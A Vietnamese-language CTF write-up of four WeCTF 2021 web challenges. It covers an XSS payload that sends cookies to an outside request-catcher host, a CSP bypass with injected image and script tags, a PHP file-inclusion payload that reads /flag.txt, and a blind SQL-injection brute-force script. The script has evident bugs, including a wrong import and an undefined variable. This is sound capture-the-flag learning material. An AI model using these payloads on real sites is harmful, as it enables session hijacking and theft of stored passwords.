# WECTF 2021 Writeup

## Cache

![](https://i.imgur.com/oRJ8QGG.png)

Truy cập vào `/flag` thì hiện `Only admin can view this!`

Kiểm tra file trong folder `handout.zip` thấy file Dockerfile.test thì chall này giấu flag ở env của python.

```Dockerfile
FROM python:3.8.10-alpine

WORKDIR /usr/src/app
RUN pip install django gunicorn
COPY . .
ENV FLAG "we{testflag}"
ENV ADMIN_TOKEN 123
CMD ["gunicorn", "cache.wsgi", "-b", "0.0.0.0:80"]
```

Có thêm cả ADMIN_TOKEN thì có vẻ nó để xác thực để lấy flag.

Check file urls.py thấy có xuất hiện bước xác thực cookies là `ADMIN_TOKEN` để có thể xem đc flag.

```python
def flag(request: HttpRequest):
    token = request.COOKIES.get("token")
    print(token, ADMIN_TOKEN)
    if not token or token != ADMIN_TOKEN:
        return HttpResponse("Only admin can view this!")
    return HttpResponse(FLAG)
```

Truy cập vào trang web uv.ctf.so để lấy cookies send script qua XSS:

```html
<script>fetch(`https://hyp.requestcatcher.com?c=${document.cookie}`)</script>
```

Sử dụng cookie đó chèn vào web và truy cập `/flag` để lấy flag

## CSP 1

Check file `app.py` ta thấy khi submit `/write` thì token được gen ngẫu nhiên

![](https://i.imgur.com/K9rTQxp.png)

```python
resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " f"'self' {filter_url(img_urls)}; script-src 'none'; ""style-src 'self'; base-uri 'self'; form-action 'self' "
```

Ta sẽ inject qua `{filter_url(img_urls)}` 

Thử send script:

```html
<img src="https://hyp.requestcatcher.com/c;script-src">
```

![](https://i.imgur.com/RvzMtzT.png)

Thì ta đã bypass đc CSP bài này khá đơn giản

Send script:

```html
<img src="http://127.0.0.1:5500;script-src"/>
<img src="http://127.0.0.1:5500/bao-cao/script.js"/>
<script src="http://127.0.0.1:5500/bao-cao/script.js"></script>
```

Yeah ta đã lấy đc admin cookies

## Include

Description: ` yet another buggy PHP website. Flag is at /flag.txt on filesystem Host 1 (San Francisco): include.sf.ctf.so Host 2 (Los Angeles): include.la.ctf.so Host 3 (New York): include.ny.ctf.so Host 4 (Singapore): include.sg.ctf.so`

Thì chắc chắn flag nằm trong `/flag.txt`

```php
<?php
show_source(__FILE__);
@include $_GET["🤯"];
```

include path file bị lỗi ta sẽ lấy file text qua 🤯

URL encode cái 🤯 ta thu đc được `%f0%9f%a4%af`

Vì vậy payload là: `/?%f0%9f%a4%af=%2fflag.txt`

## Phish 

Description: 

```
Shou is so dumb that he leaks his password (flag) to a phishing website.

Note: The flag contains underscore

Host 1 (San Francisco): phish.sf.ctf.so
Host 2 (Los Angeles): phish.la.ctf.so
Host 3 (New York): phish.ny.ctf.so
Host 4 (Singapore): phish.sg.ctf.so
```

Check source code file main.py ta thấy dữ liệu được gửi đến server rồi từ đó vào database:

```python

@app.route("/add", methods=["POST"])
def add():
    username = request.form["username"]
    password = request.form["password"]
    sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
    try:
        db.execute_sql(sql)
    except Exception as e:
        return f"Err: {sql} <br>" + str(e)
    return "Your password is leaked :)<br>" + \
           """<blockquote class="imgur-embed-pub" lang="en" data-id="WY6z44D"  ><a href="//imgur.com/WY6z44D">Please 
        take care of your privacy</a></blockquote><script async src="//s.imgur.com/min/embed.js" 
        charset="utf-8"></script> """
```

Điểm ta chú ý nhất là 

```python
sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"

```

Có vẻ như đoạn code này dính SQL injection.

Send thử payload

```python
password = "abc"
username = "(SELECT * FROM xyz)') -- "
sql = f"INSERT INTO `user`(password, username) VALUES ('{password}', '{username}')"
print(sql)
    
#   INSERT INTO `user`(password, username) VALUES ('abc', '(SELECT * FROM xyz)') -- ')
```

Nó cho phép ta SELECT cột từ các bảng hoặc các hành động khác.

Mình sẽ khai thác lấy các kí tự trong mật khẩu bằng cách ép buộc thông qua truy vấn SQL như này:

```sql
SELECT password FROM user WHERE username = "shou" AND password LIKE "%---HERE---%"
```


Chúng tôi biết rằng có một shou tên người dùng với mật khẩu là lá cờ
Do đó, chúng tôi có thể kiểm tra xem một ký tự có trong mật khẩu hay không bằng cách thêm một điều kiện mà mật khẩu LIKE '% --- HERE ---%'
Điều này hoạt động bằng cách sử dụng điều kiện LIKE, cùng với ký tự đại diện nhiều ký tự,%

Ta biết rằng có một người tên là shou tên người dùng với password là flag.

Do đó, ta có thể kiểm tra xem một kí tự có trong mật khẩu hay không bằng cách thêm một điều kiện mà `password GLOB "%---HERE---%"`

`LIKE` không thể check được chữ hoa chữ thường vì vậy ở đây t sử dụng `GLOB`

Để thực hiện điều đó ta sẽ inject như này:

* username: `hip`

* password: `a',(SELECT password FROM user WHERE username = "shou" AND password GLOB "%{i}%")); --`

Tiếp theo là brute password

Script:

```python
import request, string

u = 'http://localhost:4009/add'
s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c'
flag = 'we{'
result = ''

for i in s:
    body = {'username':'hip', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password LIKE \"%{i}%\")); --'}
    s = request.Session()
    r = s.post(u, data=body)
    if 'UNIQUE' in r.text: result += i
while flag[-1] != '}':
    for i in foundchars:
        body = {'username':'abc', 'password':f'a\',(SELECT password FROM user WHERE username = \"shou\" AND password GLOB \"{flag+i}*\"));--'}
        s = request.Session()
        r = s.post(u, data=body)
        if 'UNIQUE' in r.text: flag += i
        print(flag)
```

```python
# result: we{e0df7105-edcd-4dc6-8349-f3bef83643a9@h0P3_u_didnt_u3e_sq1m4P
```